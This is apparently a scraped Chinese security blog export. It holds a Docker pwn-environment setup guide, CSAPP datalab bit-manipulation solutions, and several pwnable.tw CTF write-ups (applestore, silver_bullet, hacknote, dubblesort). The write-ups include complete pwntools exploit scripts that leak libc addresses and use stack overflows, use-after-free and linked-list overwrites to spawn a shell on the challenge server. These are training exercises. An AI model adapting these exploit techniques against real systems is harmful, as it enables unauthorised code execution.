将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就不用担心环境问题。 总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。 也体验一下docker，这里有别人已经搭好的 https://github.com/skysider/pwndocker这里也自己搭下，体验下流程docker官方文档 复用别人的image，真爽下载 1docker pull skysider/pwndocker 启动 1docker run -d --rm -h breeze --name redhat -v /mnt/hgfs/share:/ctf/work -p 23946:23946 --cap-add=SYS_PTRACE skysider/pwndocker -d：后台运行 –rm：停止后自动删除 -h：主机名breeze –name：docker名字breeze -v：将kali的/mnt/hgfs/share挂在再docker中的/ctf/work目录（share也是kali和物理机的共享目录，三机共享） -p：端口映射（没啥用，这时已经不用ida远程调试了，有些题目带端口的可以用） –cap-add：增加一个参数，否则调试会出问题 然后就可以获取id，以后每次都用shell脚本开启就行 调试时123from pwn import *p = process([\"/path/to/ld.so\", \"./test\"], env=&#123;\"LD_PRELOAD\":\"/path/to/libc.so.6\"&#125;)context.terminal = ['tmux', 'splitw', '-h'] 第二行指定ld.so和libc 第三行要在tmux下运行才能出调试的那个终端 0x01 下载并启动ubuntu镜像Docker 把应用程序及其依赖，打包在 image 文件里面。只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。 image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。 这里我们从官网的仓库中拉取一个ubuntu 18.04的image然后自己创建一个pwn环境的image 12 docker pull ubuntu:18.04` 接下来启动ubuntu镜像； 12$ docker run -i -t --name create_env ubuntu:18.04 bashroot@5cfd7de2e9f7:/# -t 和 -i 这两个参数是必须的，代表的是可交互的。 0x02 安装环境修改源和正常的ubuntu一样，首先修改系统的源，这里使用的是清华的源：https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/依次执行下面的命令 1234567891011121314cd /etc/apt# 保存原始的sources.list文件cp sources.list sources.list.bakapt-get update# 安装编辑文本的工具，可以用自己顺手的vimapt-get install nano# 更换源之后采用https协议，需要安装该软件才行apt-get install apt-transport-https# 覆盖原始的内容echo '' &gt; sources.list# 将清华的源拷贝进去(Ctrl+Shift+v)保存nano sources.listapt-get update 使用国内镜像遇到的问题和解决办法 安装pwntools依次执行： 123apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install pwntools 安装32位库1sudo apt-get install lib32ncurses5 lib32z1 其它pwngdb解决无法ping通githubROPGadget等工具 安装tmux使用bash进入到docker中后只有一个命令行终端，这样很不方便，可以在该容器中安装tmux，来同时开启多个终端。使用apt-get install tmux来安装启动鼠标切换界面： 123root@5cfd7de2e9f7:~# touch .tmux.confroot@5cfd7de2e9f7:~# nano .tmux.conf root@5cfd7de2e9f7:~# 注意：在启用鼠标切换之后如果需要选中终端中的部分内容，需要在按住Shift的情况下才可以 tmux快捷键ctrl b + l ctrl b + n 分别是切换到last页和next页 ctrl b + [ 可以使用光标滚屏 q 退出 ctrl b + 方向键 切换split分隔的终端 0x03 将容器打包成自己的镜像经过上面的步骤，我们已经搭建好了需要的环境，下面就将这个容器打包成镜像： 首先退出该容器，然后查看已经停止运行的容器：123$ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES5cfd7de2e9f7 ubuntu:16.04 \"bash\" About an hour ago Exited (0) 13 seconds ago create_env 得到容器的id为：5cfd7de2e9f7 使用commit命令提交该容器为镜像： 1234567891011121314# 可能需要一点时间$ docker commit -m \"pwn 16.04 v2\" 5cfd7de2e9f7 e3pem/dockerpwn:v2 sha256:68136e03da7b3d544fd8ece63b6fbdcbd962948e9bcdc1a390d529cb89193ea9# 其中`-m`为提交镜像时的描述# 5cfd7de2e9f7 为容器的id# e3pem/dockerpwn:v2 为镜像的标签，将e3pem换成自己在dockerhub上的用户名# 查看构造出来的镜像$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEe3pem/dockerpwn v2 68136e03da7b 2 minutes ago 956MBe3pem/dockerpwn v1 fa2334fe2cd8 20 hours ago 1.24GBdockerpwn v1 fa2334fe2cd8 20 hours ago 1.24GBubuntu 16.04 b9e15a5d1e1a 3 weeks ago 115MB 可以选择将镜像push到dockerhub： 上传到阿里云 0x04 使用构建的镜像在分析题目的时候经常需要进行调试，在docker中调试是需要权限的，因此在第一次启动镜像的时候需要添加–privileged选项 同时可以将容器中的某一个目录和主机的目录建立映射，这样就能很方便的在宿主机和容器间共享文件了，使用-v选项来设置共享目录 1docker run -i -t --privileged -v /home/yourhost/path/ctf:/home/docker/path/ctf e3pem/dockerpwn:v2 bash 其中-v 后面的路径就是你自己的哪个文件夹要映射到容器里的哪个文件夹 在容器停止运行后，下次要继续在该容器中运行，可以按如下方法： 先获取到容器的id： 1$ docker ps -a 获取到容器的id为：6121daf720c0 建立一个脚本，内容如下： 12docker container start 6121daf720c0docker exec -i -t 6121daf720c0 bash 0x05 附上自己的镜像地址2.31 1docker pull registry.cn-hangzhou.aliyuncs.com/cooook/dockerpwn:v1 2.29 1docker pull wood1314/19pwn:v2 2.27 1docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 0x06 Referencehttps://e3pem.github.io/2019/04/19/%E6%9D%82%E9%A1%B9/%E5%9C%A8docker%E4%B8%AD%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/","tags":[{"name":"docker","slug":"docker","permalink":"wood1314.github.io/tags/docker/"}]},{"title":"pwnable-tw applestore","date":"2020-01-24T03:08:01.000Z","path":"year/01/24/cl6ewldae0039j63fjzr8bbap/","text":"0x00 前言这道题我一开始一直以为是堆，然后也一直没找到堆溢出的漏洞，最后看了题解才知道原来是个栈，利用方式以前其实也做过，还是不能思维定式了。 0x01 题目分析 可以看出主要有四个功能，大致实现就是用双向链表。结构是name|money|fd|bk这样子。 0x02 漏洞分析在checkout函数里,到了7147可以获得一部iphone8，然而这个iphone8却是用栈加进去的。 123456789101112131415161718192021unsigned int checkout()&#123; int v1; // [esp+10h] [ebp-28h] char *v2; // [esp+18h] [ebp-20h] int v3; // [esp+1Ch] [ebp-1Ch] unsigned int v4; // [esp+2Ch] [ebp-Ch] v4 = __readgsdword(0x14u); v1 = cart(); if ( v1 == 7174 ) &#123; puts(\"*: iPhone 8 - $1\"); asprintf(&amp;v2, \"%s\", \"iPhone 8\"); v3 = 1; insert((int)&amp;v2); v1 = 7175; &#125; printf(\"Total: $%d\\n\", v1); puts(\"Want to checkout? Maybe next time!\"); return __readgsdword(0x14u) ^ v4;&#125; 虽然这里没有栈溢出，但是可以利用其它函数比如delete，或者cart来修改栈上的内容。 泄露 由上可以泄露出libc地址，也可以泄露出堆地址。 还通过libc中的environ来泄露栈地址。 如何泄露栈地址？ 在libc中保存了一个函数叫_environ，存的是当前进程的环境变量 得到libc地址后，libc基址+_environ的偏移量=_environ的地址在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量之和libc库有关 通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量 修改双向链的fd bk 修改双向链表的fd bk可以在delete的过程中造成一个dwordshoot的攻击，也就相当于任意地址写四字节，然而想直接修改atoi的got表为system会出现段错误（没权限） 利用dwordshoot修改delete函数的ebp，改变handler函数中参数的位置(修改为atoi_got - 0x22)，这样my_read会直接读到atoi的got中，并且atoi_got可以往里面写。 最后仍然是利用linux的参数截断特点，输入system+‘；/bin/sh’ 获得shell 0x03 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *debug = 0d = 1if debug == 0: p = process(\"./applestore\") libc = ELF('/lib/i386-linux-gnu/libc.so.6') if d == 1: gdb.attach(p)else: p = remote(\"chall.pwnable.tw\", 10104) libc = ELF('./libc_32.so.6')def add(num): p.sendlineafter(\"&gt; \", str(2)) p.sendlineafter(\"Device Number&gt; \", str(num))def delete(ans): p.sendlineafter(\"&gt; \", str(3)) p.sendlineafter(\"Item Number&gt; \", ans)def cart(ans): p.sendlineafter(\"&gt; \", str(4)) p.sendlineafter(\"Let me check your cart. ok? (y/n) &gt; \", ans)def checkout(ans): p.sendlineafter(\"&gt; \", str(5)) p.sendlineafter(\"Let me check your cart. ok? (y/n) &gt; \", ans)for i in range(6): add(1)for i in range(20): add(2)checkout('y')elf = ELF(\"./applestore\")context.log_level = 'debug'got_atoi = elf.got['atoi']payload = 'ya' + p32(got_atoi) + p32(0xdeadbeaf) + p32(0)cart(payload)p.recvuntil(\"27: \")libc_addr = u32(p.recv(4))libc_base = libc_addr - libc.symbols['atoi']system = libc_base + libc.symbols['system']environ_libc = libc_base + libc.symbols['environ']print \"environ_libc -&gt; \" + hex(environ_libc)print \"libc_addr -&gt; \" + hex(libc_addr)print \"libc_base -&gt; \" + hex(libc_base)print \"system -&gt; \" + hex(system)payload = 'ya' + p32(environ_libc) + 'a'*(0xa - 2 - 4) + p32(0)cart(payload)p.recvuntil(\"27: \")stack = u32(p.recv(4))print \"stack -&gt; \" + hex(stack)payload = '27' + p32(stack) + p32(0x12345678)payload += p32(got_atoi + 0x22) + p32(stack - 0x10c)ebp_addr = stack - 0x10clog.success('ebp: ' + hex(ebp_addr))delete(payload)#pause()p.sendlineafter(\"&gt; \", p32(system) + \"||/bin/sh\")p.interactive()","tags":[{"name":"rop","slug":"rop","permalink":"wood1314.github.io/tags/rop/"},{"name":"pwnabletw","slug":"pwnabletw","permalink":"wood1314.github.io/tags/pwnabletw/"}]},{"title":"CSAPP Datalab","date":"2020-01-22T10:54:07.000Z","path":"year/01/22/cl6ewld8p000ej63fidigzgob/","text":"CSAPP大概都过了一遍，但是很多东西不实践一下理解还是不到位，趁这个假期尽量把11个lab做一下。 0x1 bitXor 只用位运算实现一个异或 12345678910/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) &#123; return ~(~x&amp;~y)&amp;~(x&amp;y);&#125; 思路~(x&amp;y)是把x和y中同时为1的位置为0,~(~x&amp;~y)是把x和y同时为0的位置为0，其他位都是1，然后再把两个相与，组合一下。 0x2 tmin 返回补码中的最小值 12345678910/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) &#123; return 1&lt;&lt;31;&#125; 思路根据补码的规则，只有符号位为1时，这个数最小为-2^31^。 0x3 isTmax 返回1，如果输入的x是补码中的最大值 123456789101112131415/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) &#123; int i = x + 1; x = x + i; x = ~x; i = !i; x = x + i; return !x;&#125; 思路首先补码的最大值就是符号位为0，其它位为1，我们要做的就是把这个数转化成0。这个数有个特点就是将这个数+1然后再加自己等于-1，然后再取反就等于0了，但是-1如此操作也可以得到同样的结果，所以在x = ~x后面几行就是为了排除这种情况。 0x4 allOddBits 如果所有奇数位都为1，就返回1 1234567891011121314151617181920/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) &#123; int mask = 0xaa + (0xaa&lt;&lt;8); mask += mask&lt;&lt;16; return !((x&amp;mask)^mask);&#125;/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */ 思路构造出0xaaaaaaaa，然后相与保留该数所有奇数位上为1的位，最后再异或，如果全为0则满足条件。 0x5 negate 返回它的负数 12345678910/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x+1;&#125; 思路思路，变负就是按位取反再+1. 0x6 isAsciiDignit 判断输入的ascii值是否大于等于字符0的小于等于字符9的 1234567891011121314151617/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) &#123; int sign = 1&lt;&lt;31; int lower = ~0x30; int higher = ~(sign|0x39); lower = sign&amp;(lower+x+1)&gt;&gt;31; higher = sign&amp;(higher+x)&gt;&gt;31; return !(lower|higher);&#125; 思路 lower是加上比0x30小会是负数的数字 higher是加上比0x39大的数会是负数的数字 最后看看lower和higher是否同时满足条件 0x7 conditional 用位运算符实现三目运算 123456789101112/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) &#123; int i = !!x; x = ~i+1; return (x&amp;y)|(~x&amp;z);&#125; 思路先把x转化成真值0或者1，然后注意0和1的特性，0取负以后还是0，1取负以后是-1也就是全1。最后用0和全1对y和z进行选择。 0x8 isLessOrEqual 判断参数1是否小于等于参数2 123456789101112131415161718/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) &#123; int negX = ~x + 1; int addX = negX + y; int checkSign = (addX&gt;&gt;31)&amp;1; int sign = 1&lt;&lt;31; int xLeft = x&amp;sign; int yLeft = y&amp;sign; int same = xLeft ^ yLeft; same = (same&gt;&gt;31)&amp;1; return ((!same)&amp;(!checkSign))|(same&amp;(xLeft&gt;&gt;31));&#125; 思路分两种情况： x和y符号不一样，那么x如果是负号的话就可以返回1 x和y符号一样，那么就看y-x的符号是正是负 0x9 logicalNeg 实现逻辑非 1234567891011/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) &#123; return (((~x+1)|x)&gt;&gt;31) + 1;&#125; 思路还是利用0的特性，只有0和它的补码符号位相与为全零，其它的符号位都会为1。这里+1是考虑到了最小值的特点，它和它的补码符号位都为1。 0x10 howManyBits 该数最少用几个位的补码就可以表示 123456789101112131415161718192021222324252627282930/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) &#123; int b16,b8,b4,b2,b1,b0; int sign = x&gt;&gt;31; x = (sign&amp;~x)|(~sign&amp;x); b16 = !!(x&gt;&gt;16)&lt;&lt;4; x = x&gt;&gt;b16; b8 = !!(x&gt;&gt;8)&lt;&lt;3; x = x&gt;&gt;b8; b4 = !!(x&gt;&gt;4)&lt;&lt;2; x = x&gt;&gt;b4; b2 = !!(x&gt;&gt;2)&lt;&lt;1; x = x&gt;&gt;b2; b1 = !!(x&gt;&gt;1); x = x&gt;&gt;b1; b0 = x; return b16+b8+b4+b2+b1+b0+1;&#125; 思路 如果是一个正数，那么只要找到它最高的那个1，然后再加上一个符号位就行了 如果是一个负数，那么找到它最高位的0然后再加上一个符号位就行，因为从符号位往右到第一个0的1都没意义。 所以如果x是正数，则不变，如果x是负数就给x取反 然后依次缩小范围，返回结果。 浮点数简介IEEE 浮点标准用 V=(-1)^s^M2^E^的形式表示一个数 符号, s 决定这个数是正数(s = 0)，还是负数(s = 1) 尾数 M 是一个二进制小数, 它的范围是 1 ~ 2-e，(标准化数)或者是0 ~ 1-e（非标准化数) 阶码 E 的作用是对浮点数加权 单精度浮点格式 s=1位，E=8位，M=23位 双精度浮点格式 s=1位，E=11位, M=52位 0x11 floatScale2 求2乘一个浮点数 123456789101112131415161718192021//float/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) &#123; int exp = (uf&amp;0x7f800000)&gt;&gt;23; int sign = uf&amp;(1&lt;&lt;31); if(exp == 0) return uf&lt;&lt;1|sign; if(exp == 255) return uf; exp++; if(exp == 255) return 0x7f800000|sign; return (exp&lt;&lt;23)|(uf&amp;0x807fffff);&#125; 思路 如果是非规格化数，直接乘2返回 如果是无穷大或者NaN，返回原值 再判断乘2后有没有溢出，如果没有溢出就返回更改exp后的uf 如果有溢出就返回无穷大 0x12 floatFloat2Int 浮点数转整数 12345678910111213141516171819202122232425262728/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) &#123; int s = uf&gt;&gt;31; int exp = ((uf&amp;0x7f800000)&gt;&gt;23)-127; int frac = (uf&amp;0x007fffff)|0x00800000; if(!(uf&amp;0x7fffffff)) return 0; if(exp&gt;31) return 0x80000000; if(exp&lt;0) return 0; if(exp&gt;23) frac&lt;&lt;=(exp-23); else frac &gt;&gt;= (23-exp); if(!((frac&gt;&gt;31)^s)) return frac; else if(frac&gt;&gt;31) return 0x80000000; else return ~frac+1;&#125; 思路 首先考虑特殊情况，如果是0则返回0 如果直接阶码部分就溢出了就返回 0x80000000 如果是小于0的也返回0（因为尾码的部分肯定不会大于2） 然后判断结果跟原来符号一样不一样 不一样的话，然后溢出是一种情况 原来是负数也是一种情况 0x13 floatPower2 求2.0^x^ 1234567891011121314151617181920/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) &#123; int INF = 0xff&lt;&lt;23; int exp = x + 127; if(exp &lt;= 0) return 0; if(exp &gt;= 255) return INF; return exp &lt;&lt; 23;&#125; 思路就直接改exp的值呗，把exp改成x+127就行，再看看是不是无穷大，是不是0就行了。 尾数部分全0，代表1.","tags":[{"name":"编码","slug":"编码","permalink":"wood1314.github.io/tags/编码/"}]},{"title":"pwnable tw silver-bullet","date":"2020-01-21T07:08:39.000Z","path":"year/01/21/cl6ewldai003jj63fnt4vvvm1/","text":"0x00 前言一道32位rop题，里面有个off-by-one的细节，这次没有注意，下次一定好好看 0x01 漏洞分析power_up12345678910111213141516171819int __cdecl power_up(char *dest)&#123; char s; // [esp+0h] [ebp-34h] size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(&amp;s, 0, 0x30u); if ( !*dest ) return puts(\"You need create the bullet first !\"); if ( *((_DWORD *)dest + 12) &gt; 0x2Fu ) return puts(\"You can't power up any more !\"); printf(\"Give me your another description of bullet :\"); read_input(&amp;s, 48 - *((_DWORD *)dest + 12)); strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12)); v3 = strlen(&amp;s) + *((_DWORD *)dest + 12); printf(\"Your new power is : %u\\n\", v3); *((_DWORD *)dest + 12) = v3; return puts(\"Enjoy it !\");&#125; 漏洞的关键在于strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12));，这个函数会在拼接后在结尾再加一个\\x00，所以就会把dest+12中的内容覆盖成0,因此下一次调用power_up仍然能够拼接，所以造成了栈溢出. 0x02 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *debug = 0if debug: sh = process('./silver_bullet') libc = ELF('/lib/i386-linux-gnu/libc.so.6') gdb.attach(sh) context.log_level = 'debug'else: sh = remote('chall.pwnable.tw',10103) libc = ELF('./libc_32.so.6')sh.recvuntil('Your choice :')sh.sendline('1')sh.recvuntil('Give me your description of bullet :')sh.sendline('a'*40)sh.recvuntil('Your choice :')sh.sendline('2')sh.recvuntil('Give me your another description of bullet :')sh.sendline('b'*8)sh.recvuntil('Your choice :')sh.sendline('2')sh.recvuntil('Give me your another description of bullet :')puts_plt = 0x80484A8puts_got = 0x804afdcstart = 0x8048954payload = p32(0x7FFFFFFF) +'\\xff'*3+ p32(puts_plt) + p32(start) + p32(puts_got) sh.sendline(payload)sh.recvuntil('Your choice :')sh.sendline('3')sh.recvuntil('Oh ! You win !!\\n')libc_base = u32(sh.recv(4)) - libc.symbols['puts']log.success('libc_base: ' + hex(libc_base))system_addr = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search('/bin/sh\\x00').next()log.success('system: ' + hex(system_addr))log.success('binsh: ' + hex(binsh_addr))sh.recvuntil('Your choice :')sh.sendline('1')sh.recvuntil('Give me your description of bullet :')sh.sendline('a'*47)sh.recvuntil('Your choice :')sh.sendline('2')sh.recvuntil('Give me your another description of bullet :')sh.sendline('b'*1)sh.recvuntil('Your choice :')sh.sendline('2')sh.recvuntil('Give me your another description of bullet :')payload = '\\xff'*7 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)sh.sendline(payload)sh.recvuntil('Your choice :')sh.sendline('3')sh.interactive()","tags":[{"name":"rop","slug":"rop","permalink":"wood1314.github.io/tags/rop/"}]},{"title":"pwnable-tw-Hacknote","date":"2020-01-20T14:26:28.000Z","path":"year/01/20/cl6ewldab0034j63f3ca0800s/","text":"0x00 简介一道uaf和double free题目，跟以前做的套路不太一样。 0x01 题目1.1 add函数逻辑1234567891011121314151617181920212223242526for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !ptr[i] ) &#123; ptr[i] = malloc(8u); if ( !ptr[i] ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; *(_DWORD *)ptr[i] = sub_804862B; printf(\"Note size :\"); // size大小无限制 read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = ptr[i]; v0[1] = malloc(size); if ( !*((_DWORD *)ptr[i] + 1) ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, *((void **)ptr[i] + 1), size); puts(\"Success !\"); ++dword_804A04C; return __readgsdword(0x14u) ^ v5; 申请8个字节的空间，把地址放在ptr[i]中 在前4个字节放入一个输出函数 申请一个size大小的空间，把地址放在后4字节中可以把ptr看成这样一个结构体的指针数组后面Print直接就用了这个结构题里的函数指针进行输出的1234typedef struct ptr&#123; void *func_puts; char *content;&#125;*ptr; 1.2 Delete函数逻辑1234567891011121314printf(\"Index :\");read(0, &amp;buf, 4u);v1 = atoi(&amp;buf);if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )&#123; puts(\"Out of bound!\"); _exit(0);&#125;if ( ptr[v1] )&#123; free(*((void **)ptr[v1] + 1)); free(ptr[v1]); puts(\"Success\");&#125; 判断要删除的id是否在范围内 然而删除后却并没有把已经删除的部分置为NULL 0x02 漏洞利用本题的关键点是，当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。（反正跟我原来想的完全不同，看来以后做题还是多想题目给的本身的特点，总是用套路会束缚思维） system函数地址泄露： print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。 system函数调用： 同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。 然而改成system后，函数的参数还是自己，这样肯定不行。 12if ( ptr[v1] ) (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]); 为了解决这个问题，这里涉及到Linux连续执行多条命令时的参数截断 即，如果将puts函数地址覆盖为system地址，system的参数是system函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将content位置覆盖成 ‘;sh\\0’. 0x03 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context.log_level = 'debug'def add(size,content): sh.recvuntil(\"Your choice :\") sh.sendline(\"1\") sh.recvuntil(\"Note size :\") sh.sendline(str(size)) sh.recvuntil(\"Content :\") sh.send(content)def prt(idx): sh.recvuntil(\"Your choice :\") sh.sendline(\"3\") sh.recvuntil('Index :') sh.sendline(str(idx))def delete(idx): sh.recvuntil(\"Your choice :\") sh.sendline(\"2\") sh.recvuntil('Index :') sh.sendline(str(idx))#sh = process('./hacknote')sh = remote('chall.pwnable.tw', 10102)#gdb.attach(sh)libc = ELF('./libc_32.so.6')add(128,'aaa')add(128,'bbb')delete(1)delete(0)payload = p32(0x804862b)+p32(0x804A018)add(8,payload)prt(1)free_addr = u32(sh.recv(4))log.success('free_addr: ' + hex(free_addr))offset = libc.symbols['system'] - libc.symbols['free']system_addr = free_addr + offsetdelete(2)content = p32(system_addr) + ';sh\\0'add(8,content)prt(1)log.success(\"system: \" + hex(system_addr))log.success(\"offset: \" + hex(offset))sh.interactive()","tags":[{"name":"uaf","slug":"uaf","permalink":"wood1314.github.io/tags/uaf/"},{"name":"double free","slug":"double-free","permalink":"wood1314.github.io/tags/double-free/"}]},{"title":"pwnable.tw dubble sort题解","date":"2020-01-19T08:42:52.000Z","path":"year/01/19/cl6ewldag003dj63fvr2fl7wl/","text":"0x00 前言一道基础的栈溢出，开启了pie和canary 0x01 分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax int *v4; // edi unsigned int v5; // esi int v6; // ecx unsigned int v7; // esi int v8; // ST08_4 int result; // eax int v10; // edx unsigned int v11; // et1 unsigned int v12; // [esp+18h] [ebp-74h] int v13; // [esp+1Ch] [ebp-70h] char buf; // [esp+3Ch] [ebp-50h] unsigned int v15; // [esp+7Ch] [ebp-10h] v15 = __readgsdword(0x14u); sub_8B5(); __printf_chk(1, (int)\"What your name :\"); read(0, &amp;buf, 0x40u); __printf_chk(1, (int)\"Hello %s,How many numbers do you what to sort :\"); __isoc99_scanf(\"%u\", &amp;v12); v3 = v12; if ( v12 ) &#123; v4 = &amp;v13; v5 = 0; do &#123; __printf_chk(1, (int)\"Enter the %d number : \"); fflush(stdout); __isoc99_scanf(\"%u\", v4); ++v5; v3 = v12; ++v4; &#125; while ( v12 &gt; v5 ); &#125; sort((unsigned int *)&amp;v13, v3); puts(\"Result :\"); if ( v12 ) &#123; v7 = 0; do &#123; v8 = *(&amp;v13 + v7); __printf_chk(1, (int)\"%u \"); ++v7; &#125; while ( v12 &gt; v7 ); &#125; result = 0; v11 = __readgsdword(0x14u); v10 = v11 ^ v15; if ( v11 != v15 ) sub_BA0(v6, v10); return result;&#125; 它要排序的数字的数量没有限制，因此可以造成栈溢出。 __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);可以泄露出栈上的内容 我原来是想用%s来泄露canary的，但是这样就没法泄露libc了，那么怎么绕过canary呢？这里就要用到scanf的一个小技巧。 如果直接输入非法字符的话，由于程序没有对输入流进行清空，所以之后的scanf也都会是非法字符，也就是意味着后面的输入全部无效，但是输入+或者-时是被当成一次有效输入，由于我们仅仅输入+或者-并不能直接获得一个有效数值，所以本次scanf也作为无效看待，这样就能保证stack guard不会被修改，当进行下一次scanf的时候，识别到输入流不完整也会继续I/o中断等待输入。 0x02 exp123456789101112131415161718192021222324252627282930313233from pwn import *sh = process('./dubblesort')#sh = remote('chall.pwnable.tw',10101)gdb.attach(sh)def write_data(data): sh.recvuntil('number :') sh.sendline(data)payload = ''payload += 28*'a'sh.recvuntil('name :')sh.send(payload)sh.recvuntil(payload)libc_base = u32(sh.recv(4)) - 0x1ae244log.success('libc_base: ' + hex(libc_base))libc = ELF('./libc_32.so.6')system_addr = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search('/bin/sh\\x00').next()log.success('system_addr: ' + hex(system_addr))log.success('binsh_addr: ' + hex(binsh_addr))sh.recvuntil('sort :')num = 35sh.sendline(str(num))for i in range(24): write_data('0')write_data('+')for i in range(9): write_data(str(system_addr))write_data(str(binsh_addr))sh.interactive() 0x03 参考pwnable.tw dubblesort writeup","tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"wood1314.github.io/tags/栈溢出/"}]},{"title":"gdb的调试与使用","date":"2020-01-18T08:48:12.000Z","path":"year/01/18/cl6ewld9z0025j63ftndavz4t/","text":"少部分包含gdb-peda的特性。。 gdb-peda 1. 